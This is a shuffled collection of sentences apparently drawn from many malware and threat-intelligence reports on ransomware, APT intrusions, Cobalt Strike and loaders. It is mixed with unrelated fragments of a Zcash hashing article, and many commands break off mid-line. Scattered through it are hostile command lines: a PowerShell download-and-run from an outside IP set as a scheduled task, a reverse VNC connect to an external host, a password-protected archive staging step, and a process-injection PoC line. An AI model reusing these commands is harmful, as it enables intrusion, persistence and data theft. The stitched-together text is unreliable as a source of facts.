SHA1 SHA25606b91e4a_exe.exebd69a645fa69fd8d5ba56b9c3f468711 12dc0a2de3ad30201107bfcb679de5acacf31e5c 68ff9855262b7a9c27e349c5e3bf68b2fc9f9ca32a9d2b844f2265dccd2bc0d8MD5 SHA1 SHA25623cd1f01_exe.exec850f6816459e3364b2a54239642101b
T1003.006 DCSync Attacker can extract the credentials from the DC by impersonating the domain controller and use DRSUAPI protocol to replicate credentials from DC. 
Figure 5.
However when AMSI (Antimalware Scan Interface) is activated, it will alert us, as mentioned before. 
Potentially unwanted programs Implement software allowlisting to ensure users can only install software from an approved list
Figure 4 – Code instructions for both base64 data block execution The first base64 data blob is compiled AutoIt script and the second is AutoIt interpreter (a benign file), used to run the first file. 
EOdicLoader, a 64-bit downloader for Linux, written in Go. 9D8BADE2030C93D0A010AA57B90915EB7D99EC82HSBC_job_offer.pdf.zipLinux/NukeSped.
Click here for a PDF version of this report. 
00000000`0014ff60
It’s worth noting that they use various programming platforms including C language, Go-Lang and Python.
Otherwise, the entire system, except for certain critical directories, is encrypted. 
It uses a script from this location: hxxps://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.pyi.
These parts contain various properties that collectively determine the document’s display and processing.
Once authorization is completed on the TOR site, the page shown in Figure 5 appears.
Security tools like next generation anti-virus (NGAV), endpoint protection platforms (EPP), and endpoint detection and response (EDR, XDR, and MDR) are necessary, but not sufficient to stop stealers like SYS01 stealer. 
dir %APPDATA%\Microsoft\Windows\Recent List of recently opened files and folders on the computer. 
FOCUSFJORD Trojan.Win32.DllHijack.
The following command-line syntax was observed being used to clear the System, Security and Application Windows Event Logs.
Otherwise, a jump host or other system likely used by domain admins is found and equipped with a Cobalt Strike beacon.
Look at the packet's HTTP host header.
While it was carried out through different means, the ransomware described in the report triggers an almost identical execution flow.
The team intended to use that connection to reverse tunnel traffic back to the workstation and then access the bastion host via the open SSH socket file.
Windows Command Shell (T1059.003)ATT&CK Technique: Command and Scripting Interpreter: PowerShell (T1059.001)ATT&CK Technique: Windows Management Instrumentation (T1047)ATT&CK Technique: System Services: Service Execution (T1569.002)Similar to what was observed during the post-compromise reconnaissance phase of the attack, the adversary used impacket to execute Windows Management Instrumentation (WMI) to achieve command execution on other systems present in the environment.
It also contains a User-Agent set as “Mozilla/4.08 (Charon; Inferno)”, and the Content-Key, which is a custom HTTP header whose value corresponds to a hash generated out of the HTTP header. 
F5 Big-IP Vulnerability CISA has conducted incident response engagements at Federal Government and commercial entities where the threat actors exploited CVE-2020-5902.
Dissecting One of APT29s Fileless WMI and PowerShell Backdoors POSHSPY
The URL address to which the ransomware "phones home" upon completing its work does not have anything in common with APT27 network infrastructure.
FF8D!tr PowerShell/Agent.
Next, the script creates a machine ID associated with the victim and saves it to %localappdata%\packages\m.txt for future executions.
C:\ProgramData\qwe3.txt C:\Users\[REDACTED USER]\Downloads\sns.txt C:\Windows\Temp\events_Administrator.text C:\Windows\Temp\events_[REDACTED USER].text C:\Windows\Temp\listing.txt C:\Windows\Temp\ns.txt C:\Windows\Temp\nsserv.txt IcedID The malware configuration: Configuration details: {“Campaign ID”: 2220668032 ,“C2 url”: “alockajilly.com”} Initially the IcedID malware made a connection to 64.227.12[.]180:80 for it’s first call back.
Note: Until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic.
Figure 7 shows the structure of the memory section. 
TacticIDNameDescription Resource DevelopmentT1587Develop CapabilitiesAgrius builds utility tools to use during an active exploitation process. 
During Phase II, the team established sessions that originated from a target Workstation and from the DC directly to an external host over a clear text protocol. 
Cobalt Strike has the ability to run a SOCKS proxy server on the team server.
The stealer has many obfuscated strings that are being covered by a random string, “edx765“, to evade detection.
Although the Black Basta RaaS has only been active for a couple of months, according to its leak site, it had compromised over 75 organizations at the time of this publication.
Prevent unauthorized execution by disabling macro scripts from Microsoft Office files transmitted via email.
The first note was first observed around January 2022, and the other one first appeared in August 2022.
Malware like GoBruteforcer takes advantage of weak (or default) passwords. 
in the folder “/Users/Public.”
SeroXen decryption flow. 
[D3-SCA] User Behavior Analysis [D3-UBA] Process Discovery [T1057] Chinese state-sponsored cyber actors have been observed using commands, including tasklist, jobs, ps, or taskmgr, to reveal the running processes on victim devices. 
ADFS private key extraction attempt Masquerading Active Directory exploration tool Suspicious mailbox export or access modification Possible attempt to access ADFS key material Suspicious ADFS adapter process created Figure 10.
It eventually runs: powershell.exe -ExecutionPolicy
[TA0006] OS Credential Dumping: LSASS Memory [T1003.001] OS Credential Dumping: Security Account Manager [T1003.002] OS Credential Dumping: NTDS
The payload and intermediate library are deleted before completion.
readme_contact_alex.dali@iran.ir.htm contain encrypted session keys we need in order to be able to decrypt your files. 
However, looking at the destination, which had not been previously observed in the environment, the file names (which were quite varied), and the volume of the files outbound, the analyst decided to call the client to err on the side of caution.
The content displayed on the victim’s browser lures them to click an embedded malicious hyperlink which downloads a RAR file.
<Message dependent>0x04 Compressed body size0x08 Uncompressed body size0x0C Checksum0x10CRC32 of the message body. 
As seen with fshec2, analyzing this kind of file allows defenders to extract indicators of malicious intent, making security assessment much easier. 
We have noted updates to the first-stage payloads used, with new layers of obfuscation to hinder analysis and additional decoys used for social engineering. 
Also, they created numerous fake domains that look like venture capital and bank domains.
RPCConnector and RPCBindConnector are classes that allow setting up a connection via a Named Pipe.
Ensure proper migrating steps or compensating controls are implemented for vulnerabilities that cannot be patched in a timely manner. 
APPDATA%\Chrome\winvnc.exe' -autoreconnect ID:15000151 -connect 81.91.177[.]54[:]7234 –run SMOKEDHAM created a persistence mechanism for UltraVNC by adding the application to the ConhostNT value under the current users Run registry key. 
Figure 5.
The deflated contents of the malicious ZIP file are shown in the below table with their description.
The decompression function is shown in Figure 24. Figure 24: APLib decompression function To be able to locate the embedded compressed binaries, we need to find the structure of the ISFB payload where it stores the configuration.
The following message is then displayed to the user: System Shutdown NotPetya employs a few methods to ensure that the system reboots so that the boot loader loads the MFT encryptor code. 
Microsoft is sharing details on these operations to raise awareness on the risks associated with their activity and to empower organizations to harden their attack surfaces against tradecraft commonly used by this Mint Sandstorm subgroup. 
The collected information allows Fox-IT to correlate Cobalt Strike team servers, based on various configuration settings.
Disable Clear 00000001`4001847e 0001 (0001) 0
Overview of the attack components leading to the execution of the Dolphin backdoor Dolphin analysis Analysis of Dolphin’s components and their capabilities is provided in the following section. 
We explain each of the steps in further detail in the upcoming sections. 
Microsoft released a statement that it will release a patch for it next month.
It is also possible that this is not a new operation but rather a rebrand of a previous ransomware group that brought along their affiliates.
T1204.001User Execution: Malicious LinkThe attackers have attempted to get users to open a malicious link that leads to the download of malware. 
Since ransomware will encrypt all files on a victim system and often will search for directories on the network (such as networked file shares) to also encrypt, moving highly sensitive customer data to a system with no internet access or access to the rest of the network will minimize ransomwares access to those files.
Given other DreamJob campaigns by Lazarus, this payload was probably distributed through spearphishing or direct messages on LinkedIn.
Starting in February 2023, Proofpoint observed the new Forked variant of IcedID.
We found the following list of supported commands: Get list of drives; Get content list from a specified directory; Download a file from the C2 server; Write text to a given *.bat file and execute it; Run a shell command. 
Use a network intrusion prevention system (IPS) to scan and remove malicious email attachments. 
= (xxZmgLbpuJ + position_array[position] + ord(key_array[position]))
These IP addresses were identified as being involved in malicious activities, such as performing password spray, botnet C2, and may indicate a compromised account. 
“C:\Windows\SoftwareDistribution\EventCacheManager.exe” /sc ONSTART /ru system /S
Use a domain reputation service to detect and block suspicious or malicious domains. 
The trick they pull is to display ads representing legitimate applications but in fact containing links to phishing websites.
FRP received a command-line argument from attacker used to establish a connection from the adversary-controlled infrastructure (156[.]251[.]172[.]194) over port 2333. 
Palo Alto Networks customers receive help with detection and prevention of Black Basta ransomware through the following products and services: Cortex XDR and Next-Generation Firewalls (including cloud-delivered security services such as WildFire). 
StealthWorker brute-force function targeting QNAP devices Figure 5.
The screenshot below is from the official Cobalt Strike documentation page and shows how DNS communication works between the compromised host and the C2 server. 
However, performing "cat" or "strings" reveals the actual data.
T1140
Below you can find information related to some of the most important fields that could throw off an analyst while investigating a Cobalt Strike network communication: 
The below courses of action mitigate the following techniques: System Network Configuration Discovery [T1016],
00000000`00000000
One unique feature of BlackCat ransomware is that negotiation chats can only be accessed by those holding an access token key or ransom note – the group has made efforts to avoid third-party snooping. 
Spearphishing Attachment Winnti sends phishing messages with malicious attachments T1566.002 
None of the social engineering techniques used are novel and it is imperative that employees of companies should have a good standard of security awareness about phishing emails. 
Use an antivirus program, which may stop malicious code execution that cyber actors attempt to execute via PowerShell. 
Group Policy Modification Black Basta can modify group policy for privilege escalation and defense evasion. T1574.001.
15 Returns the current user’s SID. 
Condition if N is greater than 1,024,000 The encrypted file’s structure would then be as follows (Table 2): Description Size Encrypted File Contents Rounded-up file size divisible by 16 RSA Encrypted Key 0x200 bytes Size of encrypted file / offset address of RSA Encrypted Key 8 bytes 
[TA0011], Collection [TA0009], and Exfiltration [TA0010] Use of steganography [T1027.003] to hide stolen data inside other files stored on GitHub Protocol impersonation
We maximized the usage of Windows Security EventCode 4663 for this analytic story.
UKRTA410 64-bit Rootkit/Keylogger driver. 
DEV-1084 publicly adopted the DarkBit persona and presented itself as a criminal actor interested in extortion, likely as an attempt to obfuscate Iran’s link to and strategic motivation for the attack. 
The ProcessWorm reflective loader comes with a twist.
As a threat responder, you may want to create a dashboard for NetWalker-related threat events to understand current exposure.
These samples contain slightly fewer credentials and a simpler self-propagation code that only supports downloading the payload via wget or the binary downloader embedded directly into the sample.
[WINDOWS-SECURITY] Exfil software rclone detected 5008354 [WINDOWS-SECURITY]
We’ve seen banking malware (i.e. Emotet) turn into loaders for ransomware where different threat actors can specialize in what they do best.
Trickbot implemented process hollowing by first using VirtualProtectEx on the process entrypoint, and then writing the hook stub using WriteProcessMemory. Figure 8.
"C: & cd \ & $temp\rar.exe a -r wef.rar \\<redacted_internal_ip1>\c$\windows\temp\1 -hp2wsxcde34rfv7788.
# Technique 1: Check for common sandbox-related processes sandbox_processes =
The first version of the CHM file will create a scheduled task that will use the living off the land binary msiexec to execute a remote MSI payload from the C2.
PlugX, Winnti and some other custom tools all point to a group that had access to the same tools.
Figure 44.
In these attacks, Microsoft has observed the Mint Sandstorm subgroup using CharmPower, a custom implant, in attacks that began with targeted phishing campaigns. 
Rorschach  A New Sophisticated and Fast Ransomware  Check Point Research
T1140Deobfuscate/Decode Files or InformationMultiple TA410 backdoors communicate with their C&C through encrypted and obfuscated channels. 
If it doesn’t, it downloads the file from its command and control (C2) server, then decodes and executes it.
Refer to IOCs and take necessary actions toward mitigation. 
ReversingLabs Software Supply Chain Security supports static analysis and unpacking for a wide range of binary file formats, including the kind of compiled Python byte code seen in this attack.
Bugatti strongly emphasized that they are primarily looking for experienced affiliates that focus on compromising the complete networks of organizations as opposed to end users.
InstID = the value set from "X-siLock-Step1" otherwise it creates a new account with a randomly generated username and with LoginName and RealName values set to "Health Check Service" This account is inserted it into an active MOVEit application session. 
Verify successful implementation of mitigations by executing the vendor supplied script without parameters to ensure that no vulnerabilities remain.
They found a security operations (SecOps) network diagram detailing the network boundaries between Site 5 SecOps on-premises systems, Site 5 non-SecOps on-premises systems, and Site 5 SecOps cloud infrastructure.
After receiving a request for a red team assessment (RTA) from an organization and coordinating some high-level details of the engagement with certain personnel at the organization, CISA conducted the RTA over a three-month period in 2022. 
Ransom Cartel TOR Site Ransom Cartel’s website for communication with victims was available via a TOR link provided in the ransom note.
EDE2AB811311FC011B1E89C5A0B7A60C123B7398hidmouse.sysWin64/Agent.
Because of the beaconing activity, persistence, and apparent ability to wipe event logs, it is likely that tox5 is a component of Cobalt Strike or similar framework. 
ISO Files The ISO files that X-Force observed contained a LNK file disguised as an exe icon, subsequently containing a HWP file, and a batch file.
This is known as chaining beacons.
From there, the loader reached out to the Bumblebee C2 server.
[“username1:pass1” “username2:pass2” … ] Perfc.dat is the malware name.
It achieves this by creating a scheduled task entry, which executes the export function “StartA” from the DLL “c6gt.b” using rundll32.exe on a daily basis. 
Generally, ransomware affiliates avoid targeting healthcare facilities, K-12 educational institutions, international organizations and coalitions, and local, provincial, or federal governments.
As it is highly unlikely that the criminals own so many residential IP addresses, it is possible that they use some victims as proxies, or some vulnerable devices to forward communication to their real C&C servers. 
Figure 11 – NoEscape Ransom note Linux Variant The NoEscape Linux variant consists of three files: “script_linux.sh,” “script_esxi.sh” and “164f8295_linux.elf“. 
But the code contains a full-fledged implementation of this protocol, which could be used in other attacks: the developers would simply need to set this connection type in the configuration. 
Conclusion POSHSPY is an excellent example of the skill and craftiness of APT29.
Call function allocates memory space and copies content of file Hangarer.
10”.
The script also creates three more Windows shortcut files in the victim’s machine startup folder, with the details of the target path pointing to the folders where the payloads are eventually downloaded.
Agent.
These include the utilization of Golang, a programming language rarely used in Camaro Dragon tools, minimal lightweight functionality, and embedded bypass of a specific antivirus software commonly installed on potential targets.
It should be expected that these attacks will continue in the region for a long time, so we will keep monitoring these activities. 
Judging by the name fields and the functionality of the tool, they probably used the software they are selling in the black market. 
We will hit right-click and follow in the dump.
GlobeImposter’s Delivery Methods Explained GlobeImposter is most often delivered via phishing email as an attachment or a link to a malicious attachment.
Detect: Network Traffic Analysis Protocol Metadata Anomaly Detection
This URI is typical of those used to download FlowCloud, a complex C++ implant described in the next section. 
However, this is changed in such a way that it isn’t readily unpacked using standard solutions and requires manual unpacking.
Another clue that helped us was the use of DNS tunneling by Winnti which we discovered traces of in memory.
WebException] { $statusCode =
In addition, the randomly named directories are typically created in a previously existing directory that’s one level off of the root of the C drive.
Therefore we leave it to the reader to choose whether to concur regarding involvement by APT27. Conclusion In this article, we have described an APT27 attack on a media company.
For some of the payloads we have corresponding phishing emails that were used as lures to deliver the files, allowing analysis of the social engineering techniques used.
POTENTIAL COBALT STRIKE INSTALLATION - TOX5.EXE Initial static review of the tox5 sample did not reveal much information, indicators show that this may have the ability to clear event logs. 
Net.WebRequest]::Create(\\\"http://5.188.33.190/Robots.txt\\\");(new-object System.IO.StreamReader(($r.GetResponse()).GetResponseStream())).ReadToEnd() | powershell.exe -noprofile -\"" /f schtasks /Create
The collected data is transferred to the C2 server as a zip file.
file_private_1 and session_public_1 are paired together to generate a shared key, which is hashed using SHA3.
title: Ransom Cartel Ransomware: A Possible Connection With REvil url: https://unit42.paloaltonetworks.com/ransom-cartel-ransomware/ This post is also available in: 日本語 (Japanese)Executive Summary Ransom Cartel is ransomware as a service (RaaS) that surfaced in mid-December 2021.
Figure 3 – Files inside the exposed infrastructure under the OneForAll file path. 
References\n[Zcash]: Daira Hopwood, Sean Bowe, Taylor Hornby, Nathan Wilcox.
The impersonated token replaces the current thread token with SetThreadToken and the thread is resumed. 
The below courses of action mitigate the following techniques: Create Account
This very complex backdoor contains interesting espionage capabilities.
The actors executed a PowerShell command on the AD to obtain a list of all machines attached to the domain. 
The Logic Pro X dropper binary is deleted with the /tmp/ bundle.
The 1226 repository Upon unarchiving the compressed file, we found two files with the fake extension “.doc” containing one-byte XOR encrypted sections.
Download the PDF version of this report: #StopRansomware: Royal Ransomware (PDF, 586.96 KB ) 
Runtime.
The domains, including pivoted domains, imitate venture capital names or big bank names.
kernel32_RegSetValueExA 0xC2D33DC : ntdll_RtlGetVersion 0xBD5D03A : kernel32_GetNativeSystemInfo 0x10BEDD60 : wininet_CreateMD5SSOHash To resolve the API hash, the malware first passes two arguments to the "mw_resolveAPI" function.
The National Security Agency, Cybersecurity and Infrastructure Security Agency (CISA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China state-sponsored malicious cyber activity is a major threat to U.S. and Allied cyberspace assets.
APT29 wrote the encrypted and base64-encoded PowerShell backdoor code into that property. 
Parser PeNet.
The tool is also password protected, which adds an extra layer of complexity when ascertaining the program’s functionality. 
`wineventlog_security` EventCode=4663 object_file_path="*\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" AND NOT (process_path IN ("*:\\Windows\\explorer.exe", "*:\\Windows\\System32\\dllhost.exe", "*\\chrome.exe")) 
Pushing the optimizations even further, the Zcash team decided to use a signed version of the windowed-multiplication method.
Conti scans the network for 445/SMB, looking for machines to encrypt. 
Unusual login behavior was detected between August 22 and 24, 2018, and the airline proceeded to block further access.
.NET languages can use Python code just as easily. 
If those two libraries are missing on the system, then the sample won’t be able to run. 
We observed a new Visual Basic Script, a previously unseen Windows Batch file, and a Windows executable.
Collectors are gadgets that retrieve a value already present in a register, and save it back into the attacker’s counterfeit object (i.e. as a returned value from an invoked API). 
The benign files are usually different in different droppers used by the attackers. 
This alert flags a token’s unusual characteristics, such as its token lifetime or played from an unfamiliar location.
Taking a closer look at the Invoker in the disassembler reveals a few interesting aspects. 
Stack view of info loaded from the beacon config. 
AdGuard issued a total account-wide password reset, but states that no internal servers or data were compromised. 
Instead of downloading illegal software, choose alternative freeware solutions from reputable sources and platforms. 
title: Open-Source Gh0st RAT Still Haunting Inboxes 15 Years After Release url: https://cofense.com/blog/open-source-gh0st-rat-still-haunting-inboxes-15-years-after-release/ Found in Environments Protected by: ProofpointBy Nathaniel Raymond, Cofense IntelligenceGh0st RAT, a decades-old open-source remote administration tool (RAT), recently appeared in phishing campaigns targeting a healthcare organization.
WSMan connection string registry location While not strictly related to the O365 PowerShell activity, the Windows Event Log Microsoft-Windows-WinRM%4Operational.evtx also included information on connection attempts made to external O365 tenants.
Then it tries to access memory address pointed by it, which raises exception as zero is inaccessible memory address. 
title: Banking Trojan Techniques: How Financially Motivated Malware Became Infrastructure url: https://unit42.paloaltonetworks.com/banking-trojan-techniques/ Executive Summary While advanced persistent threats get the most breathless coverage in the news, many threat actors have money on their mind rather than espionage.
This AES encryption key will then be encrypted by an RSA-2048 public key that is embedded in the ransomware executable.
In addition to having similar coding styles and utilising similar API calls, Domino Backdoor uses the same configuration structure as the Lizar Loader.
The service creates 3 listener threads: NewProcessListener: Enumerates all running processes and injects the rootkit when new processes are created. 
.mdf 
This serves to further legitimize the package in the eyes of the victim and draw attention away from the malicious binary. Figure 3.
+65.6983.8730 Japan: +81.50.1790.0200 Palo Alto Networks has shared these findings, including file samples and indicators of compromise, with our fellow Cyber Threat Alliance (CTA) members.
-h \”[PDF decoy file]\” & rundll32 \”[current DLL file path]\” #1 Bitdefender: cmd /c
Conclusion The attackers have expended some effort regarding the domain names used for their websites, trying to be as similar to the official names as possible.
However, we believe that invalid compilation dates were set due to incorrect system date and time settings.
Periscope, and Temp.
This is also around the time that Emotet dropped the IcedID Lite Loader onto the Epoch 4 and Epoch 5 botnet.
Blockchain-old.pdf c:\users\public\rwinsta.exe* start c:\users\public\Inproc.exe "%cd%\Blockchain.pdf" The Inproc.exe is a legitimate mshta.exe file (MD5 0b4340ed812dc82ce636c00fa5c9bef2), and the rwinsta.exe is a legitimate rundll32.exe file (MD5 ef3179d498793bf4234f708d3be28633).
[-29, -63]\n\nH = ZcashPedersenHash(message)\nassert 129 * G1 == H\nSince the encoding of our message using Zcash’s encoding function is [-29, -63], the hash of this message corresponds to the linear combination\nH(M) = −29 ⋅ G1 − 63 ⋅ G2\nHowever, since we know that G2 = 35 ⋅ G1, we can rewrite the previous equation as\nH(M) = −29 ⋅ G1 − 63 ⋅ 35 ⋅ G1 = −2234 ⋅ G1 = 129 ⋅ G1\nsince -2234 is equal to 129 modulo the group order, 139.\n
Implement multiple failed login attempt account lockouts. 
Folder and executes it using mshta.exe. Figure 12 Drop file in Temp location 
Around the same time, we identified ransomware and wiper malware samples resembling those used in the first wave, though with a few interesting modifications that likely allowed evasion of security controls and better attack speeds.
Exchange Email Delegate Permissions [T1098.002] Create Account: Local Account [T1136.001] Office Application Startup: Office Test [T1137.002] Office Application Startup:
BTP rule prevents Ransomware activity on Linux. 
Cofense Intelligence identified an email targeting a European-owned medical technology organization located in China, attempting to deliver Gh0st RAT via an embedded link.
"$TMPDIR/MacOS";mkdir "$TMPDIR/MacOS";(find "$SCRIPTPATH" -type f -maxdepth 1 -exec cp {} "$TMPDIR" \;) > /dev/null 2>&1;(find "$SCRIPTPATH/MacOS" -type f -mindepth 1 -maxdepth 1 -exec ln -s ../ {} "$TMPDIR/MacOS" \;) > /dev
While Mandiant does not suspect many victims were compromised, this technique is being reported for broader awareness.
The payload consists of two files: svchast.exe It functions as a simple local shellcode loader.
Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10).
Mandiant confirmed the user intended to download, install, and use the SmartPSS software.
As of April 25, 2022, all of the information claimed to have been exfiltrated by ALPHV is available to download for free on a .onion domain provided on the public-facing ALPHV extortion website with the same name.
These are somewhat esoteric Remote Access Trojans used by the APT27 group (also known as Bronze Union, LuckyMouse, Emissary Panda, or Iron Tiger).
Figure 5. URL requests seen by the VirusTotal sandbox during execution of the malicious RTF document 
Victims include organizations in the following sectors: construction and engineering, retail, transportation, commercial services, insurance, machinery, professional services, telecommunication, auto components and pharmaceuticals. 
Figure 4: Persistence of the BAT file (4.2). 
These emails may contain a malicious link or files that will provide the cyber actor access to the victim’s device after the user clicks on the malicious link or opens the attachment. 
It involves placing decoy systems, decoy credentials and decoy contents all throughout the production network essentially converting it into a trap, playing a crucial role in mitigating the attacks. 
The team used the krbtgt account hash throughout the rest of their assessment to perform golden ticket attacks [T1558.001] in which they forged legitimate TGTs.
CONTROL_PROCESSES_INJECT The control code that injects r77 into a specific process, if it is not yet injected. CONTROL_PROCESSES_INJECT_ALL 
For victims, this makes infections highly likely — and dangerous.
To prevent this attack, we should:Use advanced security solutions, including next-generation firewalls on network perimeters and network detection and response (NDR), to monitor all interactions within our IT environment.
GuLoader leverages user-initiated scripts or shortcut files to execute multiple rounds of highly obfuscated commands and encrypted shellcode.
One of the PlugX samples consisted of the following three parts: Filename Hashes HPCustPartic.exe SHA256: 8857232077b4b0f0e4a2c3bb5717fd65079209784f41694f8e1b469e34754cf6 HPCustPartUI.dll SHA256: 0ee5b19ea38bb52d8ba4c7f05fa1ddf95a4f9c2c93b05aa887c5854653248560 HPCustPartic.bin SHA256:
In their latest campaign, LockBit has once again embraced the approach of disseminating malware through malicious document files targeting Korean individuals.
Ensure that User-ID is only enabled for internal trusted interfaces CORTEX XSOAR Deploy XSOAR Playbook – Access Investigation Playbook Deploy XSOAR Playbook – Block Account Generic Deploy XSOAR Playbook – Impossible Traveler CORTEX XDR PREVENT Configure Host Firewall Profile Enable Anti-Exploit Protection Configure Restrictions Security Profile Configure Behavioral Threat Protection under the Malware Security Profile Enable Anti-Malware Protection Credential Access The below courses of action mitigate the following techniques: Credentials from Password Stores [T1555] CORTEX XDR Cortex XDR monitors for behavioral events and files associated with credential access and exfiltration Discovery 
The following extensions have been observed (.zmi5z, .nwixz, .ext, .zje2m, .5vm8t, .m4tzt). 
Stage 4: Enigma Stealer MD5 SHA-1 SHA-256 File size 4DC2D57D9DB430235B21D7FB735ADF36 98BF3080A85743AB933511D402E94D1BCEE0C545 4D2FB518C9E23C5C70E70095BA3B63580CAFC4B03F7E6DCE2931C54895F13B2C 2954.75 KB (2954752 bytes) 
On the hosts of presumably greatest interest, the SysUpdate and HyperBro backdoors were installed for reliable persistence and access. 
Often, research teams do not publish their results when it disproves their own hypothesis.
These observations amplify the importance of securing accounts and monitoring for high-risk users, especially those with high privileges. 
Ransom Cartel typically gains initial access to an environment via compromised credentials, which is one of the most common vectors for initial access for ransomware operators.
However, there are some notable, but broad similarities between the tactics, techniques, and procedures (TTPs) used by UNC4857 and those associated with FIN11 data theft extortion activity.
Section Once the .text section is copied, it will start resolving many different Windows APIs using kernel32.GetProcAddress. 
Network Service Discovery T1046 During Phase II
The earlier variant is much more limited in functionality compared to the 2019 variant. 
Redactions added. 
We also show that the old “LOLNEK” Onion address and the Onion address within the TZW variant are hosted on the same server as two vhosts. 
This enables the operators to setup a listening port and leverage it to relay traffic to and from the open beacon session.
This script called a combination of QueueUserAPC, GetCurrentThreadId, OpenThread, and VirtualAlloc to perform process injection of shellcode stored in Base64. 
Microsoft Defender for Endpoint detects this malware and related malicious activity on both Windows and Linux devices.
Malicious Actors are always trying to find new ways in to infect their victims.
The last of the downloadable modules we were able to obtain and dissect was ProcList.
T1115Clipboard
Activity Microsoft tracks as part of the larger Mint Sandstorm group overlaps with public reporting on groups known as APT35, APT42, Charming Kitten, and TA453. 
APT actors have relied on multiple avenues for initial access.
4becc0d518a97cc31427cd08348958cda4e00487c7ec0ac38fdcd53bbe36b5cc Webinjects: ef6603a7ef46177ecba194148f72d396d0ddae47e3d6e86cf43085e34b3a64d4 Emotet: dd20506b3c65472d58ccc0a018cb67c65fab6718023fd4b16e148e64e69e5740 Kronos: aad98f57ce0d2d2bb1494d82157d07e1f80fb6ee02dd5f95cd6a1a2dc40141bc Zeus: 0f409bc42d5cd8d28abf6d950066e991bf9f4c7bd0e234d6af9754af7ad52aa6 IcedID: 358af26358a436a38d75ac5de22ae07c4d59a8d50241f4fff02c489aa69e462f Dridex: ffbd79ba40502a1373b8991909739a60a95e745829d2e15c4d312176bbfb5b3e Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us 
As seen in Figure 15, it achieves this by creating an invisible window with a custom class and registering two clipboard formats.
Depending on the configuration keys used, the loader can either load the fcClientDll RAT module directly, thus bypassing most of the complex deployment process, or it can create a service or scheduled task.
Hello packet: - SSL Version - Accepted Ciphers - List of Extensions - Elliptic Curves - Elliptic Curve Formats For more information on how JA3 works, you can visit the official GitHub repository here: https://github.com/salesforce/ja3. 
Meanwhile, they developed customized toolsets designed to collect confidential documents in the exfiltration stage. 
/s /tn "update" /f schtasks /delete
This is a detection evasion technique making LSASS load pc.dll while avoiding appearing as an added (registered) Security Package.
A bug has been identified in Microsoft JET Database Engine that could allow remote execution.
Its structure shows that it is created by experienced authors, using well known, yet not trivial techniques.
This attack is effective for attackers as many sandboxing solutions are not able to handle project files and struggle with fileless malware.
Figure 4 Decryption routine When we analyzed this unique routine, we discovered similarities and the mention of it in a publication that can be read here.
It first ensures that a file within the %TEMP% does not exist before attempting to launch the payload.
Also, in some cases the GetResponse service has been used to send the email.
31 Returns the list of top-level and child window titles not owned by the current or parent process. 
ModifiedProperties | where AdminConsent.
After confirming the FTP accounts did not provide shell access into the environment, the threat actor began attempting to connect into the environment via VPN.
Each product can provide a different aspect for protection to cover the techniques observed in this attack: Microsoft 365 Defender Suspicious email-sending pattern from new Exchange inbound connector – This alert is generated when a suspicious email-sending pattern originating from a new Exchange inbound connector is detected.
This enables us to detect APT and ransomware operators and halt communications with attackers’ servers.
Such overlap could suggest a stronger link between the current NetWalker version and the other ransomware versions from Eriknetwalker, possibly even explaining the name overlap. 
5086014001000000 40610fecfb7f0000 "cmd.exe /C calc" Running the PoC application with all parameters With the above command we provided the following parameters:00001e000000 as a storage buffer for our counterfeit object,5086014001000000 as the Invoker vfgadget in addition to40610fecfb7f0000 which is the WinExec memory address. 
The domain associated with the Cobalt Strike C2 (dimentos[.]com) has an unredacted Whois record that reveals several other domains also registered by the address pokix19891[@]kindbest[.]com.
Additionally, we believe the victims were already using PsExec, and Agrius operators chose to use PsExec to blend into typical administrative activity on the victims’ machines, and for ease of batch file execution.
It allows to bundle various elements of an application together (i.e. the main executable, used DLLs, configs), along with a script that controls where are they going to be extracted, and what their execution order is.
Querying service tag informationAddSecurityPackage64.dll injects pc.dll into LSASS by deploying pc.dll as a Security Package.
Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.
Per the ransom note, the only way to engage the threat actor is via email at the provided catB9991 protonmail address.
title: Abusing cloud services to fly under the radar url: https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/ tl;dr NCC Group and Fox-IT have been tracking a threat group with a wide set of interests, from intellectual property (IP) from victims in the semiconductors industry through to data from the airline industry. 
Winnti uses both widely available tools (Metasploit, Cobalt Strike, PlugX) and custom-developed ones, which are constantly increasing in number.
Depending on the sample, explorer.exe and winlogon.exe are the target processes. 
It can be purchased with a six-month license that includes updates and support.
The email sender goes on to claim that “The CPA I used last year is retired, so here I am on the lookout for a new firm to work with.” 
Microsoft Defender for IoT has alerts for the following vulnerabilities and exploits which may be tied to Zerobot activity: CVE-2014-8361 CVE-2016-20017 CVE-2017-17105 CVE-2017-17215 CVE-2018-10561 CVE-2018-20057 CVE-2019-10655 CVE-2020-7209 CVE-2020-10987 CVE-2020-25506 CVE-2021-35395 CVE-2021-36260 CVE-2021-42013 CVE-2021-46422 CVE-2022-22965 CVE-2022-25075 CVE-2022-26186 CVE-2022-26210 CVE-2022-30023 CVE-2022-30525 CVE-2022-31137 CVE-2022-33891 CVE-2022-34538 CVE-2022-37061 ZERO-36290 ZSL-2022-5717 Microsoft Defender Antivirus Microsoft Defender Antivirus detects the malicious files under the following platforms and threat names: 
As a first attempt, let us simply interpret the 6-bit value as an integer encoded in little-endian bits, resulting in an integer in the range {0, 63}.
The batch file deletes the following registry keys: HKCR\.EXE HKCR\.dll HKCR\* Then it runs the following to attempt to clear file system cache memory: 
This can be seen in Figure 12. 
Trending Threats Adwind Trojan Circumvents Antivirus Software To Infect Your PC (September 24, 2018) 
https://darktrace.com/blog/business-email-compromise-to-mass-phishing-campaign-attack-analysis[4] https://darktrace.com/blog/breakdown-of-a-multi-account-compromise-within-office-365 
This list can be reset via a dedicated command. 
Figure 14.
Our other post touched on Malleable C2 profiles and how threat actors use them; however, that was just some of their many applications.
It seems, that it is somehow possible to hide some files in the folder, but this was buggy during my tests. running a jar from the WebDAV 
Once found, the “ffmpeg.dll” loads the second DLL into memory. 
At this point, installation of the backdoor is complete.
PowerShell Black Basta has encoded PowerShell scripts to download additional scripts. 
[WINDOWS-CLIPBOARD] net commands 5008373 [WINDOWS-CLIPBOARD] net commands 5008374 [WINDOWS-CLIPBOARD] query user command 5008375 
